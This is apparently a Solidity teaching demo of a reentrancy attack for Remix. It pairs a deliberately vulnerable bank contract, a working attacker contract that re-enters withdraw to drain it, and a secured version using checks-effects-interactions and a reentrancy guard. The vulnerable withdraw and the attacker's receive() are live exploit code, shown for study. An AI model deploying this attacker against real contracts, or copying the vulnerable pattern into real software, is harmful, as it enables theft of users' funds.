// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * Layer2SecurityDemo_Instrumented_FriendlyFallback.sol
 *
 * Instrumented demo for Remix:
 * - Adds events to trace deposit/withdraw/fallback/reentry.
 * - Attacker.receive() uses a low-level .call to invoke target.withdraw(...)
 *   and intentionally DOES NOT revert if the nested withdraw fails. This
 *   makes the vulnerability demonstration reliable in the Remix VM.
 *
 * IMPORTANT: the behavior of swallowing nested reverts is only for demo
 * purposes to reliably visualize reentrancy. Do NOT copy this pattern to
 * production code.
 *
 * Demo steps:
 * 1) Deploy VulnerableBank from Account[0]
 * 2) From Account[0] call deposit() with Value = 10 ether
 * 3) Deploy Attacker from Account[1] with constructor arg = VulnerableBank address
 * 4) From Account[1] call depositToTarget() with Value = 1 ether
 * 5) From Account[1] call attack(1 ether)
 * 6) Watch events and balances — VulnerableBank should be drained
 */

/// ---------------------------------------------------------------------
/// VULNERABLE CONTRACT (instrumented)
/// ---------------------------------------------------------------------
contract VulnerableBank {
    mapping(address => uint256) public balances;

    event Deposited(address indexed user, uint256 amount, uint256 newBalance);
    event Withdrawing(address indexed user, uint256 amount, uint256 contractBalanceBefore);
    event SentTo(address indexed to, uint256 amount, bool success, uint256 contractBalanceAfter);

    /// Deposit ETH into the contract
    function deposit() external payable {
        require(msg.value > 0, "no value");
        balances[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value, balances[msg.sender]);
    }

    /// View user balance
    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }

    /// Vulnerable withdraw (interaction before effects)
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient balance");

        emit Withdrawing(msg.sender, amount, address(this).balance);

        // Vulnerable: interaction before effects
        (bool sent, ) = msg.sender.call{value: amount}("");
        emit SentTo(msg.sender, amount, sent, address(this).balance);
        require(sent, "transfer failed");

        // Effects updated after interaction (vulnerable)
        balances[msg.sender] -= amount;
    }

    /// Allow receiving Ether
    receive() external payable {}
}

/// ---------------------------------------------------------------------
/// ATTACKER CONTRACT (friendly fallback for demo)
/// ---------------------------------------------------------------------
contract Attacker {
    VulnerableBank public target;
    address public owner;
    bool internal inAttack;

    event AttackStarted(uint256 amount);
    event ReceivedFallback(address indexed from, uint256 amount, bool inAttack, uint256 targetBalance);
    event ReenteredWithdraw(uint256 tryAmt, uint256 targetBalance);
    event NestedWithdrawAttempt(uint256 tryAmt, bool success, uint256 targetBalanceAfter);
    event AttackFinished(uint256 stolenBalance);

    constructor(address payable vulnerableAddress) {
        target = VulnerableBank(vulnerableAddress);
        owner = msg.sender;
    }

    /// Deposit some ETH to VulnerableBank to set attacker's mapping balance
    function depositToTarget() external payable {
        require(msg.value > 0, "send ETH");
        // Forward deposit to the target so the attacker has an internal balance
        target.deposit{value: msg.value}();
    }

    /// Start the attack
    function attack(uint256 amount) external {
        require(msg.sender == owner, "not owner");
        emit AttackStarted(amount);
        inAttack = true;
        target.withdraw(amount); // triggers fallback -> reentrancy
        inAttack = false;
        emit AttackFinished(address(this).balance);
    }

    /// Fallback — re-enters VulnerableBank.withdraw() while state not yet updated
    /// Demo-friendly: use low-level call to invoke withdraw and DO NOT revert on nested failure.
    receive() external payable {
        emit ReceivedFallback(msg.sender, msg.value, inAttack, address(target).balance);

        if (inAttack && address(target).balance > 0) {
            uint256 drainAmount = address(target).balance >= 1 ether
                ? 1 ether
                : address(target).balance;

            emit ReenteredWithdraw(drainAmount, address(target).balance);

            // Use a low-level call to trigger target.withdraw(uint256).
            // DO NOT revert the fallback if the nested withdraw fails (ok == false).
            (bool ok, ) = address(target).call(
                abi.encodeWithSignature("withdraw(uint256)", drainAmount)
            );

            emit NestedWithdrawAttempt(drainAmount, ok, address(target).balance);
            // continue even if ok == false so outer transfer doesn't see a revert
        }
    }

    /// Withdraw stolen funds to attacker wallet
    function cashout() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }

    /// Check how much ETH this contract has stolen
    function getStolenBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/// ---------------------------------------------------------------------
/// REENTRANCY GUARD (for SecureBank)
/// ---------------------------------------------------------------------
contract ReentrancyGuard {
    uint256 private _status;
    constructor() {
        _status = 1; // 1 = NOT_ENTERED
    }

    modifier nonReentrant() {
        require(_status == 1, "reentrant");
        _status = 2;
        _;
        _status = 1;
    }
}

/// ---------------------------------------------------------------------
/// SECURE BANK (safe variant)
/// ---------------------------------------------------------------------
contract SecureBank is ReentrancyGuard {
    mapping(address => uint256) public balances;

    event Deposited(address indexed user, uint256 amount, uint256 newBalance);
    event Withdrawn(address indexed user, uint256 amount, uint256 contractBalanceAfter);

    function deposit() external payable {
        require(msg.value > 0, "no value");
        balances[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value, balances[msg.sender]);
    }

    /// Safe withdraw — Checks-Effects-Interactions + Reentrancy Guard
    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "insufficient balance");

        // Effects first
        balances[msg.sender] -= amount;

        // Interaction last
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "transfer failed");

        emit Withdrawn(msg.sender, amount, address(this).balance);
    }

    receive() external payable {}
}
